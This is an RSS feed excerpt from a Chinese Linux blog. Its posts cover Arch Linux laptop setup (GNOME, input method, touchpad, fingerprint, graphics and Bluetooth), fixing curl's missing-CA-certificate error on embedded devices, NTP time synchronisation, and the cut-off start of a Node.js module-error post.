接下来的操作可以切到个人帐号了。
</p>

<div class="org-src-container">
<pre class="src src-sh">su - tangxinfa
</pre>
</div>
</div>
</div>

<div id="outline-container-org980f1c5" class="outline-2">
<h2 id="org980f1c5">安装 gnome 桌面</h2>
<div class="outline-text-2" id="text-org980f1c5">
<div class="org-src-container">
<pre class="src src-sh">sudo pacman -S gnome gnome-extra gdm
sudo systemctl enable gdm
sudo systemctl -f enable graphical.target
sudo systemctl enable NetworkManager
</pre>
</div>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/GNOME_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">GNOME (简体中文) - ArchWiki</a></li>

<li><a href="https://wiki.archlinux.org/index.php/GDM_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">GDM (简体中文) - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-org55a265e" class="outline-2">
<h2 id="org55a265e">安装 fcitx 输入法</h2>
<div class="outline-text-2" id="text-org55a265e">
<p>
参考
</p>

<ul class="org-ul">
<li><a href="http://blog.kankanan.com/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html">Archlinux下安装fcitx输入法 | 看看俺 – KanKanAn.com</a></li>

<li><a href="https://wiki.archlinux.org/index.php/Fcitx">Fcitx - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-orgb22f2f1" class="outline-2">
<h2 id="orgb22f2f1">安装 yaourt</h2>
<div class="outline-text-2" id="text-orgb22f2f1">
<dl class="org-dl">
<dt>yaourt</dt><dd>Yet AnOther User Repository Tool</dd>
</dl>


<p>
封装了 pacman，支持安装用户软件仓库里的软件包。
</p>

<p>
<code>/etc/pacman.conf</code> 添加配置
</p>
<pre class="example">
[archlinuxfr]
SigLevel = Optional TrustAll
Server = http://repo.archlinux.fr/$arch
</pre>

<p>
安装 yaourt
</p>
<div class="org-src-container">
<pre class="src src-sh">pacman -S yaourt
</pre>
</div>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="http://bashell.nodemedia.cn/archives/install-yaourt.html">Yaourt的安装及使用 | 贝壳博客</a></li>
</ul>
</div>
</div>

<div id="outline-container-orgcf509f6" class="outline-2">
<h2 id="orgcf509f6">触摸板</h2>
<div class="outline-text-2" id="text-orgcf509f6">
<div class="org-src-container">
<pre class="src src-sh">yaourt -S xf86-input-synaptics
</pre>
</div>

<ul class="org-ul">
<li><p>
触摸板调优
</p>

<p>
<a href="http://blog.kankanan.com/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html">Thinkpad T540p修复linux下触摸板按下时光标位置移动问题 | 看看俺 – KanKanAn.com</a>
</p>

<p>
为避免打字时误触，在 ~/.xprofile 中添加以下内容：
</p>
<pre class="example">
syndaemon -d -i 2 -t
</pre></li>

<li><p>
触摸板失灵
</p>

<p>
移动光标位置却是滚动效果（就像是单指操作变成双指操作了），移动光标时位置卡顿。
</p>

<p>
安装 evtest
</p>
<div class="org-src-container">
<pre class="src src-sh">yaourt -S evtest
</pre>
</div>

<p>
获取触摸板事件号
</p>
<pre class="example">
$ cat /proc/bus/input/devices | grep Synaptics -A 10 | grep event
H: Handlers=event15 mouse1 
</pre>

<p>
检测触摸板事件
</p>
<pre class="example">
$ sudo evtest /dev/input/event15
</pre>

<p>
发现触摸板失灵时，也有触模板压下事件产生，估计是硬件不灵敏了，应该可以通过调整相关参数忽略掉 <code>man</code> <code>synaptics</code> 。
</p>

<p>
使用蓝牙音箱时，触模板必失灵，需要重启系统触模板才能恢复，暂未找到解决方案。
</p></li>
</ul>

<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/Touchpad_Synaptics">Touchpad Synaptics - ArchWiki</a></li>
</ul>
</div>
</div>

<div id="outline-container-org4fc3647" class="outline-2">
<h2 id="org4fc3647">指纹识别</h2>
<div class="outline-text-2" id="text-org4fc3647">
<p>
安装指纹识别模块
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S fprintd libfprint-git
</pre>
</div>

<p>
录入指纹
</p>

<div class="org-src-container">
<pre class="src src-sh">fprintd-enroll
</pre>
</div>

<p>
测试指纹
</p>

<div class="org-src-container">
<pre class="src src-sh">fprintd-verify
</pre>
</div>

<p>
多测试几次，如果效果不好则重新录入。
</p>

<p>
锁定桌面，试试使用指纹解锁。
</p>


<p>
参考
</p>

<ul class="org-ul">
<li><a href="https://github.com/ars3niy/fprint_vfs5011/issues/9">Verify result always returning "verify-no-match" · Issue #9 · ars3niy/fprint_vfs5011</a></li>
</ul>
</div>
</div>

<div id="outline-container-orga50c16f" class="outline-2">
<h2 id="orga50c16f">定制 gnome3</h2>
<div class="outline-text-2" id="text-orga50c16f">
<p>
安装扩展
</p>

<ul class="org-ul">
<li><p>
程序托盘图标回到屏幕右上角
</p>

<p>
<a href="https://extensions.gnome.org/extension/495/topicons/">TopIcons</a>
</p></li>

<li><p>
窗口标题栏融入活动栏
</p>

<p>
<a href="https://extensions.gnome.org/extension/723/pixel-saver/">Pixel Saver</a>
</p></li>
</ul>

<p>
调试扩展
</p>

<ul class="org-ul">
<li><p>
启动 Looking Glass
</p>

<p>
按快捷键 <code>Alt</code> + <code>F2</code> 输入 <code>lg</code>
</p></li>

<li><p>
切到 Extensions 页
</p>

<p>
找到出问题的插件，点击 Show Errors，一般是系统少安装了某些包，使用 pacman 安装即可
</p></li>

<li><p>
重新载入桌面
</p>

<p>
按快捷键 <code>Alt</code> + <code>F2</code> 输入 <code>r</code>
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org483f101" class="outline-2">
<h2 id="org483f101">避免启动后总是静音</h2>
<div class="outline-text-2" id="text-org483f101">
<p>
安装 alsa-utils，保存音量设置。
</p>
</div>
</div>

<div id="outline-container-org3b8f961" class="outline-2">
<h2 id="org3b8f961">显卡驱动</h2>
<div class="outline-text-2" id="text-org3b8f961">
<p>
机器是双显卡，一块 Intel 的集显加上 Nvida 的独显。
默认的开源显卡驱动也够用，使用 Nvida 的独显效果更好。
</p>

<div class="org-src-container">
<pre class="src src-sh">pacman -S nvidia
</pre>
</div>
<p>
参考 <a href="http://blog.csdn.net/zhyh1986/article/details/39892611">ArchLinux边用边记 - 竹叶青的专栏 - 博客频道 - CSDN.NET</a>
</p>
</div>
</div>

<div id="outline-container-org9611ccb" class="outline-2">
<h2 id="org9611ccb">蓝牙耳机</h2>
<div class="outline-text-2" id="text-org9611ccb">
<p>
安装相关软件包
</p>
<div class="org-src-container">
<pre class="src src-sh">yaourt -S pulseaudio-bluetooth bluez-firmware bluez-utils paman
</pre>
</div>

<p>
启动蓝牙服务
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl enable bluetooth
sudo systemctl start bluetooth
</pre>
</div>

<p>
参考
</p>
<ul class="org-ul">
<li><a href="https://wiki.archlinux.org/index.php/Bluetooth_headset_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Bluetooth headset (简体中文) - ArchWiki</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[修复 SSL certificate problem: unable to get local issuer certificate]]></title>
            <link>/article/4fee590d-ssl-certificate-problem-unable-to-get-local-issuer-certificate.html</link>
            <guid>/article/4fee590d-ssl-certificate-problem-unable-to-get-local-issuer-certificate.html</guid>
            <pubDate>Mon, 14 Mar 2016 12:36:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在嵌入式 linux 设备上使用 curl 访问 https 站点会报错：
</p>
<pre class="example">
# curl https://www.google.com
curl: (60) SSL certificate problem: unable to get local issuer certificate
More details here: http://curl.haxx.se/docs/sslcerts.html

curl performs SSL certificate verification by default, using a "bundle"
 of Certificate Authority (CA) public keys (CA certs). If the default
 bundle file isn't adequate, you can specify an alternate file
 using the --cacert option.
If this HTTPS server uses a certificate signed by a CA represented in
 the bundle, the certificate verification probably failed due to a
 problem with the certificate (it might be expired, or the name might
 not match the domain name in the URL).
If you'd like to turn off curl's verification of the certificate, use
 the -k (or --insecure) option.
</pre>

<p>
而 linux 桌面上使用 curl 访问 https 站点则正常：
</p>
<pre class="example">
$ curl https://www.google.com
&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;
&lt;H1&gt;302 Moved&lt;/H1&gt;
The document has moved
&lt;A HREF="https://www.google.com.hk/?gfe_rd=cr&amp;amp;ei=i2DmVtXLDOzN8geg-afACA"&gt;here&lt;/A&gt;.
&lt;/BODY&gt;&lt;/HTML&gt;
</pre>

<p>
嵌入式 linux 设备上缺少了 CA 证书。
</p>

<div id="outline-container-org541de1f" class="outline-2">
<h2 id="org541de1f">什么是 CA 证书</h2>
<div class="outline-text-2" id="text-org541de1f">
<blockquote>
<p>
Certificate Authority (CA) Certificates
</p>

<p>
A certificate authority (CA) is a trusted entity that issues electronic documents that verify a digital entity’s identity on the Internet. The electronic documents, which are called digital certificates, are an essential part of secure communication and play an important part in the public key infrastructure (PKI). Certificates typically include the owner's public key, the expiration date of the certificate, the owner's name and other information about the public key owner.
</p>
</blockquote>
<p>
引用自 <a href="http://searchsecurity.techtarget.com/definition/certificate-authority">What is certificate authority (CA)? - Definition from WhatIs.com</a>
</p>
</div>
</div>

<div id="outline-container-orgd4e6dcd" class="outline-2">
<h2 id="orgd4e6dcd">获取 CA 证书</h2>
<div class="outline-text-2" id="text-orgd4e6dcd">
<p>
比较有名的 CA 证书列表由 mozilla 维护，<a href="https://curl.haxx.se/">curl</a> 提供了命令行工具 <a href="https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl">mk-ca-bundle.pl</a> ，用于下载 mozilla 维护的 CA 证书列表，转换成 SSL 应用程序可直接使用的格式。
</p>

<p>
linux 系统的 CA 证书由操作系统发行版负责维护，没有统一的标准规定如何维护和管理 CA 证书。
</p>

<p>
Archlinux 的 CA 证书由 <a href="https://www.archlinux.org/packages/core/any/ca-certificates/">ca-certificates</a> 包维护，CA 证书来自依赖的包 <a href="https://www.archlinux.org/packages/core/i686/ca-certificates-mozilla/">ca-certificates-mozilla</a> 及 <a href="https://www.archlinux.org/packages/core/any/ca-certificates-cacert/">ca-certificates-cacert</a> 。
</p>
<pre class="example">
$ pacman -Qi ca-certificates
Name            : ca-certificates
Version         : 20150402-1
Description     : Common CA certificates (default providers)
Architecture    : any
URL             : http://pkgs.fedoraproject.org/cgit/ca-certificates.git
Licenses        : GPL2
Groups          : None
Provides        : None
Depends On      : ca-certificates-mozilla  ca-certificates-cacert
Optional Deps   : None
Required By     : curl  glib-networking  mono  neon  perl-lwp-protocol-https  qt4
Optional For    : lib32-openssl  openssl  wget
Conflicts With  : None
Replaces        : None
Installed Size  : 1024.00 B
Packager        : Jan Alexander Steffens (heftig) &lt;jan.steffens@gmail.com&gt;
Build Date      : 2015年04月03日 星期五 04时36分52秒
Install Date    : 2015年04月13日 星期一 16时04分37秒
Install Reason  : Installed as a dependency for another package
Install Script  : No
Validated By    : Signature
$ pacman -Ql ca-certificates
$ pacman -Ql ca-certificates-cacert
ca-certificates-cacert /usr/
ca-certificates-cacert /usr/share/
ca-certificates-cacert /usr/share/ca-certificates/
ca-certificates-cacert /usr/share/ca-certificates/trust-source/
ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/
ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_class3.crt
ca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_root.crt
ca-certificates-cacert /usr/share/licenses/
ca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/
ca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/LICENSE
$ pacman -Ql ca-certificates-mozilla
ca-certificates-mozilla /usr/
ca-certificates-mozilla /usr/share/
ca-certificates-mozilla /usr/share/ca-certificates/
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.neutral-trust.crt
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.supplement.p11-kit
ca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.trust.crt
</pre>

<p>
拷贝 Archlinux 的 CA 证书文件 /etc/ssl/certs/ca-certificates.crt 到嵌入式 linux 设备，
curl 编译时需要通过 <code>--with-ca-bundle</code> 指定默认的 CA 证书文件，运行时通过 <code>--cacert</code> 选项指定
</p>
<pre class="example">
# curl https://www.google.com --cacert /etc/ssl/certs/ca-certificates.crt
&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;
&lt;H1&gt;302 Moved&lt;/H1&gt;
The document has moved
&lt;A HREF="https://www.google.com.hk/?gfe_rd=cr&amp;amp;ei=LoDmVuXlB9TC8gecrZv4DA"&gt;here&lt;/A&gt;.
&lt;/BODY&gt;&lt;/HTML&gt;
</pre>
</div>
</div>

<div id="outline-container-org84e585f" class="outline-2">
<h2 id="org84e585f">更新 CA 证书</h2>
<div class="outline-text-2" id="text-org84e585f">
</div>
<div id="outline-container-org965953c" class="outline-3">
<h3 id="org965953c">使用 openwrt 的嵌入式设备</h3>
<div class="outline-text-3" id="text-org965953c">
<p>
可以通过 opkg 进行安装和更新 CA 证书文件
</p>

<div class="org-src-container">
<pre class="src src-sh">opkg install ca-certificates
opkg upgrade ca-certificates
</pre>
</div>
</div>
</div>

<div id="outline-container-org33e9280" class="outline-3">
<h3 id="org33e9280">使用 linux 的嵌入式设备</h3>
<div class="outline-text-3" id="text-org33e9280">
<p>
如果没有软件包管理器，可以从 linux 服务器上定时下载最新的 CA 证书文件。
</p>

<p>
linux 服务器上的 CA 证书文件可以通过两种方式更新
</p>

<ul class="org-ul">
<li><p>
更新 ca-certificates 软件包
</p>

<p>
CentOS 6.4
</p>
<div class="org-src-container">
<pre class="src src-sh">yum update ca-certificates
</pre>
</div>

<p>
CentOS 6.4 的 CA 证书文件 /etc/pki/tls/certs/ca-bundle.crt
</p></li>

<li><p>
<a href="https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl">mk-ca-bundle.pl</a> 脚本生成最新的 CA 证书文件
</p>

<p>
该脚本生成的 CA 证书文件包含 mozilla 维护的证书
</p>

<div class="org-src-container">
<pre class="src src-sh">mk-ca-bundle.pl -q ca-bundle.crt
</pre>
</div></li>
</ul>
</div>
</div>
</div>

<div id="outline-container-orge8dcfa9" class="outline-2">
<h2 id="orge8dcfa9">参考</h2>
<div class="outline-text-2" id="text-orge8dcfa9">
<ul class="org-ul">
<li><a href="https://en.wikipedia.org/wiki/Root_certificate">Root certificate - Wikipedia, the free encyclopedia</a></li>

<li><a href="https://curl.haxx.se/docs/sslcerts.html">cURL - SSL CA Certificates</a></li>

<li><a href="https://gist.github.com/jjb/996292">How to securely acquire the Mozilla root certificate bundle for use with curl, Net::HTTP, etc.</a></li>

<li><a href="https://curl.haxx.se/docs/mk-ca-bundle.html">mk-ca-bundle</a></li>

<li><a href="https://wiki.openwrt.org/doc/howto/wget-ssl-certs">SSL and Certificates in wget - OpenWrt Wiki</a></li>

<li><a href="https://www.happyassassin.net/2015/01/12/a-note-about-ssltls-trusted-certificate-stores-and-platforms/">A note about SSL/TLS trusted certificate stores, and platforms (OpenSSL and GnuTLS)</a></li>

<li><a href="http://searchsecurity.techtarget.com/definition/certificate-authority">What is certificate authority (CA)? - Definition from WhatIs.com</a></li>

<li><a href="https://projects.archlinux.org/svntogit/packages.git/tree/trunk/PKGBUILD?h=packages/curl">PKGBUILD of curl on Archlinux</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux 系统时间同步]]></title>
            <link>/article/linux-7cfb7edf65f695f4540c6b65.html</link>
            <guid>/article/linux-7cfb7edf65f695f4540c6b65.html</guid>
            <pubDate>Thu, 10 Mar 2016 06:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<dl class="org-dl">
<dt>ntp</dt><dd>Network Time Protocol，即网络时间同步协议。</dd>
</dl>

<div id="outline-container-orgd0f6969" class="outline-2">
<h2 id="orgd0f6969">安装 ntp</h2>
<div class="outline-text-2" id="text-orgd0f6969">
<p>
ntpdate 和 ntpd 通常包含在 ntp 软件包里，但有的系统是单独打包。
</p>

<p>
ntpdate 命令用于直接同步时间。
</p>

<p>
ntpd 服务用于平滑同步时间。
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S ntp
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd27db2c" class="outline-2">
<h2 id="orgd27db2c">使用 ntpdate 命令同步时间</h2>
<div class="outline-text-2" id="text-orgd27db2c">
<p>
ntpdate 命令用于强制性的将系统时间设置为 ntp 服务器时间，导致时钟跃变，可能会引起系统不稳定。
</p>
</div>

<div id="outline-container-org4c940c0" class="outline-3">
<h3 id="org4c940c0">手工同步一次</h3>
<div class="outline-text-3" id="text-org4c940c0">
<p>
带 -d 选项，调试运行，不修改本地时间
</p>
<pre class="example">
<span class="linenr"> 1: </span># ntpdate -d s1a.time.edu.cn
<span class="linenr"> 2: </span> 9 Mar 18:46:29 ntpdate[20537]: ntpdate 4.2.4p8@1.1612-o Fri Feb 22 11:23:28 UTC 2013 (1)
<span class="linenr"> 3: </span>Looking for host s1a.time.edu.cn and service ntp
<span class="linenr"> 4: </span>host found : 202.112.10.60
<span class="linenr"> 5: </span>transmit(202.112.10.60)
<span class="linenr"> 6: </span>receive(202.112.10.60)
<span class="linenr"> 7: </span>transmit(202.112.10.60)
<span class="linenr"> 8: </span>receive(202.112.10.60)
<span class="linenr"> 9: </span>transmit(202.112.10.60)
<span class="linenr">10: </span>receive(202.112.10.60)
<span class="linenr">11: </span>transmit(202.112.10.60)
<span class="linenr">12: </span>receive(202.112.10.60)
<span class="linenr">13: </span>transmit(202.112.10.60)
<span class="linenr">14: </span>server 202.112.10.60, port 123
<span class="linenr">15: </span>stratum 1, precision -20, leap 00, trust 000
<span class="linenr">16: </span>refid [PPS], delay 0.06285, dispersion 0.00003
<span class="linenr">17: </span>transmitted 4, in filter 4
<span class="linenr">18: </span>reference time:    da8a8b53.73391350  Wed, Mar  9 2016 19:45:23.450
<span class="linenr">19: </span>originate timestamp: da8a8b5c.3f42dc7c  Wed, Mar  9 2016 19:45:32.247
<span class="linenr">20: </span>transmit timestamp:  da8a7d86.32fde4c3  Wed, Mar  9 2016 18:46:30.199
<span class="linenr">21: </span>filter delay:  0.06323  0.06317  0.06299  0.06285 
<span class="linenr">22: </span>         0.00000  0.00000  0.00000  0.00000 
<span class="linenr">23: </span>filter offset: 3542.028 3542.028 3542.028 3542.028
<span class="linenr">24: </span>         0.000000 0.000000 0.000000 0.000000
<span class="linenr">25: </span>delay 0.06285, dispersion 0.00003
<span id="coderef-ntpdate_debug_offset" class="coderef-off"><span class="linenr">26: </span>offset 3542.028898</span>
<span class="linenr">27: </span>
<span class="linenr">28: </span> 9 Mar 18:46:30 ntpdate[20537]: step time server 202.112.10.60 offset 3542.028898 sec
</pre>

<dl class="org-dl">
<dt>行 <a href="#coderef-ntpdate_debug_offset" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-ntpdate_debug_offset');" onmouseout="CodeHighlightOff(this, 'coderef-ntpdate_debug_offset');">26</a> </dt><dd>本机时间比时间服务器慢了 3542.028898 秒</dd>
</dl>

<p>
不带 -d 选项，修改本地时间
</p>
<pre class="example">
# ntpdate s1a.time.edu.cn
ntpdate s1a.time.edu.cn
 9 Mar 19:51:51 ntpdate[20553]: step time server 202.112.10.60 offset 3542.052347 sec
</pre>
</div>
</div>

<div id="outline-container-org7ccd9d2" class="outline-3">
<h3 id="org7ccd9d2">定期自动同步时间</h3>
<div class="outline-text-3" id="text-org7ccd9d2">
<p>
长时间运行的系统，会与标准时间产生偏差，通过 crontab 每日运行一次
</p>

<p>
<code>/etc/cron.daily/ntpdate</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

/usr/sbin/ntpdate s1a.time.edu.cn &gt;/dev/null 2&gt;&amp;1
</pre>
</div>

<p>
请记得为 <code>/etc/cron.daily/ntpdate</code> 添加可执行权限。
</p>
</div>
</div>
</div>

<div id="outline-container-orgf6a4f16" class="outline-2">
<h2 id="orgf6a4f16">使用 ntpd 服务同步时间</h2>
<div class="outline-text-2" id="text-orgf6a4f16">
<dl class="org-dl">
<dt>ntpd</dt><dd>Network Time Protocol (NTP) Daemon
The ntpd program is an operating system daemon that synchronizes the system clock to remote NTP time servers or local reference clocks.</dd>
</dl>


<p>
ntpd 服务的配置文件为 /etc/ntp.conf 。
</p>

<p>
ntpd 如果时间偏差过大（默认 1000 秒钟），ntpd 会输出错误到系统日志后退出，所以在服务启动前需要先同步好时间。
</p>

<p>
某嵌入式系统上的 ntpd 服务脚本：
</p>

<p>
<code>/etc/init.d/S49ntp</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">! /bin/</span><span style="color: #b5bd68;">sh</span>
<span style="color: #969896; font-style: italic;">#</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">System-V init script for the openntp daemon</span>
<span style="color: #969896; font-style: italic;">#</span>

<span style="color: #f0c674;">PATH</span>=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
<span style="color: #f0c674;">DESC</span>=<span style="color: #8abeb7;">"network time protocol daemon"</span>
<span style="color: #f0c674;">NAME</span>=ntpd
<span style="color: #f0c674;">DAEMON</span>=/usr/sbin/$<span style="color: #f0c674;">NAME</span>
<span style="color: #f0c674;">NTPDATE_BIN</span>=/usr/bin/ntpdate

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Gracefully exit if the package has been removed.</span>
<span style="color: #b294bb;">test</span> -x $<span style="color: #f0c674;">DAEMON</span> || <span style="color: #b5bd68;">exit</span> 0

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Read config file if it is present.</span>
<span style="color: #b5bd68;">if</span> [ -r /etc/default/$<span style="color: #f0c674;">NAME</span> ]
<span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">.</span> /etc/default/$<span style="color: #f0c674;">NAME</span>
<span style="color: #b5bd68;">fi</span>

<span style="color: #b5bd68;">case</span> <span style="color: #8abeb7;">"$1"</span><span style="color: #b5bd68;"> in</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> start)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> [ -x $<span style="color: #f0c674;">NTPDATE_BIN</span> ] ; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> -n <span style="color: #8abeb7;">"Getting initial time via ntp"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   $<span style="color: #f0c674;">NTPDATE_BIN</span> $<span style="color: #f0c674;">NTPDATE_OPTS</span> $<span style="color: #f0c674;">NTPSERVERS</span> &gt; /dev/null 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"."</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">fi</span>

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> -n <span style="color: #8abeb7;">"Starting $DESC: $NAME"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   start-stop-daemon -S -q -x $<span style="color: #f0c674;">DAEMON</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"."</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ;;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> stop) <span style="color: #b294bb;">echo</span> -n <span style="color: #8abeb7;">"Stopping $DESC: $NAME"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   start-stop-daemon -K -q -n $<span style="color: #f0c674;">NAME</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"."</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ;;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> reload|force-reload) <span style="color: #b294bb;">echo</span> -n <span style="color: #8abeb7;">"Reloading $DESC configuration..."</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   start-stop-daemon -K -q -n $<span style="color: #f0c674;">NAME</span> -s 1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"done."</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> ;;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> restart) <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"Restarting $DESC: $NAME"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   $<span style="color: #f0c674;">0</span> stop
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   $<span style="color: #f0c674;">0</span> start
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ;;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> *) <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"Usage: $SCRIPTNAME {start|stop|restart|reload|force-reload}"</span> &gt;&amp;2
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">exit</span> 1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   ;;
<span style="color: #b5bd68;">esac</span>

<span style="color: #b5bd68;">exit</span> 0
</pre>
</div>

<p>
其中 $NTPDATE_OPTS 定义在 /etc/default/ntpd 中：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #f0c674;">NTPDATE_OPTS</span>=<span style="color: #8abeb7;">"-t 5"</span>
</pre>
</div>

<p>
通过 ntpdate 同步初始时间失败，ntpd 服务可能因为当前系统时间与时间服务器偏差过大而退出。
</p>

<p>
同步失败的原因：
</p>

<ul class="org-ul">
<li>开机后网络尚未连通</li>

<li>时间服务器繁忙</li>

<li>网络环境限制使用 NTP 协议</li>

<li><p>
命令执行超时
</p>

<p>
域名解析、网络请求处理都会占用时间，5 秒钟不一定能完成。
</p></li>
</ul>

<p>
由于脚本是在系统启动过程中运行，再延长超时时间可能导致开机启动时间变长。
</p>

<p>
可以配置 ntpd 在时间偏差过大时仍然同步时间（注意：ntpd 第一次需要 4-5 分钟才能完成同步），有以下几种方法：
</p>

<ul class="org-ul">
<li><p>
添加 -g 命令行选项
</p>

<p>
<code>-g</code> 本地时间与时间服务器偏差达过大（默认为 1000 秒）时，不退出，同步一次时间。
</p></li>

<li><p>
设置 NTPD_PANICGATE 环境变量
</p>

<p>
绝大部分命令行选项都可以通过加 NTPD_ 前缀的环境变量进行设置。
</p></li>

<li><p>
修改配置文件
</p>

<p>
将以下内容添加到 /etc/ntp.conf 最前面
</p>
<div class="org-src-container">
<pre class="src src-sh">tinker panic 0
</pre>
</div></li>
</ul>
</div>

<div id="outline-container-orgc9bec59" class="outline-3">
<h3 id="orgc9bec59">手工同步一次</h3>
<div class="outline-text-3" id="text-orgc9bec59">
<p>
通过 ntpd 的命令行选项可以更好地完成 ntpdate 的功能。
</p>

<p>
<code>-q</code> 同步一次后退出。
</p>

<div class="org-src-container">
<pre class="src src-sh">ntpd -g -q
</pre>
</div>

<p>
上面的命令会确保同步一次时间后结束。
</p>
</div>
</div>
</div>

<div id="outline-container-org9529405" class="outline-2">
<h2 id="org9529405">参考</h2>
<div class="outline-text-2" id="text-org9529405">
<ul class="org-ul">
<li><a href="http://blog.csdn.net/suer0101/article/details/7868813">使用ntpdate更新系统时间</a></li>

<li><a href="http://acooly.iteye.com/blog/1993484">NTP服务及时间同步(CentOS6.x)</a></li>

<li><a href="http://www.psce.com/blog/kb/how-to-periodically-synchronize-time-in-linux/">How to periodically synchronize time in Linux?</a></li>

<li><a href="http://www.tldp.org/LDP/sag/html/basic-ntp-config.html">Basic NTP configuration</a></li>

<li><a href="http://linux.die.net/man/8/ntpd">ntpd(8): Network Time Protocol daemon - Linux man page</a></li>

<li><a href="http://askubuntu.com/a/443077/397632">How to force a clock update using ntp? - Ask Ubuntu</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Module version mismatch 错误排查]]></title>
            <link>/article/module-version-mismatch-95198bef639267e5.html</link>
            <guid>/article/module-version-mismatch-95198bef639267e5.html</guid>
            <pubDate>Wed, 02 Mar 2016 07:41:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
node.js 应用启动时出现以下错误：
</p>
<pre class="example">
Error: Cannot find module '../build/Debug/addon'
    at Function.Module._resolveFilename (module.js:339:15)
    at Function.Module._load (module.js:290:25)
    at Function._load (/usr/lib/node_modules/pm2/node_modules/pmx/lib/transaction.js:62:21)
    at Module.require (module.js:367:17)
    at require (internal/module.js:16:19)
    at Object.&lt;anonymous&gt; (node_modules/heapdump/lib/main.js:18:15)
